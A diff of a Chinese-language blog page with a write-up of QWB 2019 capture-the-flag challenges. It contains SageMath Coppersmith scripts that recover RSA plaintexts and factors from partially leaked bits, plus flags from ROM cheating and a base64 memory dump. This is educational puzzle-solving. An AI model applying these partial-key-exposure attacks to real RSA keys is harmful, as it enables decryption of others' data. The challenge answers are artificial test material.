class="number">0xfabc61918e517c9bf73b2bf5d91f30a80c19de72a995e1c47de8f9be1bb4006b6dd10a11adb95ce73613e6236aa4e91db6d5c8f07dac16000000000000000000</span></span><br><span class="line"></span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">epsilon = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line"></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = floor(nbits*(beta^<span class="number">2</span>/e-epsilon))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"upper %d bits (of %d bits) is given"</span> % (nbits-kbits, nbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m + x) ^ e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line"><span class="keyword">print</span> m + x0</span><br><span class="line"><span class="keyword">print</span> x0</span><br></pre></td></tr></table></figure>
 <p>丢到在线网站: <code>https://sagecell.sagemath.org/</code><br>得到<code>13132102744876364837010657674093125827216092673699264307134817022461255433729251935499820467653979827420832582244375851850135494237158389876362816492294802</code><br>转hex提交</p>
@@ -240,7 +244,7 @@
 [+]m=random.getrandbits(512)
 [+]c=pow(m,e,n)=0x2ea82d02c8405c04606f471756806a9d17cd0d9bedc636f7d884244745e086dbef806e4cfa440780f93abb33d5d295227df4cca71783f6693a6ea7c7775188f8cd814fadaec1a67087e5b6e1d3f51985243f057f667c663f59fbf638ea745b7aa6f57deff8da242b18086c2e8dba028613f01d100269d3342f0094e9c91eddL
 [+]((p&gt;&gt;128)&lt;&lt;128)=0xa19bcc2975554445de9f02e634661d4f6a665336a0af5c6a6f93758a8d23dfec8b258004a431974f371132c3ca7696ef00000000000000000000000000000000L
-[-]long_to_bytes(m).encode(&apos;hex&apos;)=$
+[-]long_to_bytes(m).encode(&#39;hex&#39;)=$
 </code></pre><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x62645f7122276f971d8be2c280c50af2a4d24f64c66d887a63412eca8318139b63d3a208bea26c760f9da2a4a5532193120ef2741863e506ef56f972afbf88072de0626af4a7f119342e524c3467f2a0b593127646a08dd9edeb94772d844847a0e4adbba021ff157a1c41393840d32966ca4b425be64c5cd7be71f15f1c0c0f</span></span><br><span class="line">p=<span class="number">0xa19bcc2975554445de9f02e634661d4f6a665336a0af5c6a6f93758a8d23dfec8b258004a431974f371132c3ca7696ef00000000000000000000000000000000</span></span><br><span class="line">c=<span class="number">0x2ea82d02c8405c04606f471756806a9d17cd0d9bedc636f7d884244745e086dbef806e4cfa440780f93abb33d5d295227df4cca71783f6693a6ea7c7775188f8cd814fadaec1a67087e5b6e1d3f51985243f057f667c663f59fbf638ea745b7aa6f57deff8da242b18086c2e8dba028613f01d100269d3342f0094e9c91edd</span></span><br><span class="line">beta = <span class="number">0.5</span></span><br><span class="line">epsilon = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line">p_fake = p + <span class="number">0x100000000000000000000000000000000</span></span><br><span class="line">pbits = p.nbits()</span><br><span class="line">kbits = floor(n.nbits() * (beta^<span class="number">2</span> - epsilon))</span><br><span class="line">pbar = p_fake &amp; (<span class="number">2</span>^pbits<span class="number">-2</span>^kbits)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"><span class="keyword">print</span> x0 + pbar</span><br></pre></td></tr></table></figure>
 <p>求得p=8464128337073235841306774067889692521235027856600640285732672852346488815451647340168593969676910111879627488847926492818393003168975897246870844426887263<br>q=n/p=8163069655763991394338137148931618671791210480216681019589422494491872929647892079092083346702116373697540683755495323751341124306366881478618522649358929</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br></pre></td></tr></table></figure>
@@ -255,7 +259,7 @@
 [+]c=pow(m,e,n)=0x72920d5cc7aef95112d4800535f2e479a10d4901af657ff06dbc105ef4e9a7bec7fb86e3af7ea3e393d919ba21464f90af9781acad2c2ca8041282c7a0e03267fe62ddf57d7ace68a7f55f8aa1e45f312ea9a1cbbb5cc1a4172aec0ef12b3c853a915573864545ce9c03cb8b50bc1cb241a6221495a9d78e472afda50d9b2174L
 [+]d=invmod(e,(p-1)*(q-1))
 [+]d&amp;((1&lt;&lt;512)-1)=0xb51c0c25d4b249e9a2c8d3daf342136c05e3c2ab32fea94033e4cb01d553ac0770c32884556eee08d3a61cde383c2caa7ea68fb7367f88a0312e948c4c4ac293L
-[-]long_to_bytes(m).encode(&apos;hex&apos;)=$  
+[-]long_to_bytes(m).encode(&#39;hex&#39;)=$  
 </code></pre><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"Found"</span></span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"FAILED"</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n=<span class="number">0x7792e8692d355b543bd466603bf0d63e9f80c178695c5fdf8781a7718422f3df04de72ad0d8758274108d6e5b9fae9fe548c218589da15e5bcdd3c4d64d881e0ee1437a5280b16d127b85773ee4b662d8c032ccf08bb9cd270cc03e12b8884bc22439ef833cbaffc629f1e5022fd200eb7ae459104b19efa8a1d7dfe5fcb52cd</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    d=<span class="number">0xb51c0c25d4b249e9a2c8d3daf342136c05e3c2ab32fea94033e4cb01d553ac0770c32884556eee08d3a61cde383c2caa7ea68fb7367f88a0312e948c4c4ac293</span></span><br><span class="line">    beta = <span class="number">0.5</span></span><br><span class="line">    epsilon = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = floor(nbits*(beta^<span class="number">2</span>+epsilon))</span><br><span class="line">    d0 = d &amp; (<span class="number">2</span>^kbits<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    p = find_p(d0, kbits, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found p: %d"</span> % p</span><br><span class="line">    q = n//p</span><br><span class="line">    <span class="keyword">print</span> d</span><br><span class="line">    <span class="keyword">print</span> inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
 <p>后面不会了, 鸽了</p>
 <hr>
@@ -263,10 +267,10 @@
 <h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag{welcome_to_qwb_2019}</p>
 <h3 id="鲲or鳗orGame"><a href="#鲲or鳗orGame" class="headerlink" title="鲲or鳗orGame"></a>鲲or鳗orGame</h3><p>选游戏, js里找到<code>var romPath = &quot;rom/game.gb&quot;;</code></p>
 <p>下载下来, 用GameBoy模拟器打开, 金手指启动, 把最高纪录改到<code>0xff</code>即可得到flag:</p>
-<p><img src="/2019/01/18/强网杯2019/1.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/1.png" alt="img"></p>
 <p>flag{PS03R49UE576R421RE8}</p>
 <h3 id="强网先锋-AD"><a href="#强网先锋-AD" class="headerlink" title="强网先锋-AD"></a>强网先锋-AD</h3><p>IDA反编译以后可以看到程序读入了一段字节</p>
-<p>动态调试一下, 在内存里dump出来:<br>    0072| 0x7fffffffdc28 –&gt; 0x7fffffffdc60 (“ZmxhZ3ttYWZha3VhaWxhaXFpYW5kYW9ifQ==”)</p>
+<p>动态调试一下, 在内存里dump出来:<br>    0072| 0x7fffffffdc28 —&gt; 0x7fffffffdc60 (“ZmxhZ3ttYWZha3VhaWxhaXFpYW5kYW9ifQ==”)</p>
 <p>解base64即可:<code>flag{mafakuailaiqiandaob}</code></p>
 <h3 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋-辅助"></a>强网先锋-辅助</h3><p>给了两组rsa:</p>
 <pre><code>c1 = 2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597
@@ -328,16 +332,16 @@ n2 = 146246626287258206186223708039486308540946878143383348274628703575827952918
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&text=强网杯2019"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&is_video=false&description=强网杯2019"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=强网杯2019&body=Check out this article: http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&name=强网杯2019&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&text=强网杯2019"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&is_video=false&description=强网杯2019"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯2019&body=Check out this article: http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&name=强网杯2019&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -378,13 +382,23 @@ n2 = 146246626287258206186223708039486308540946878143383348274628703575827952918
 </body>
 </html>
 <!-- styles -->
+
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
 <link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
+
 <!-- jquery -->
+
 <script src="/lib/jquery/jquery.min.js"></script>
+
+
 <script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
 <script src="/js/main.js"></script>
+
 <!-- search -->
 
 <!-- Google Analytics -->
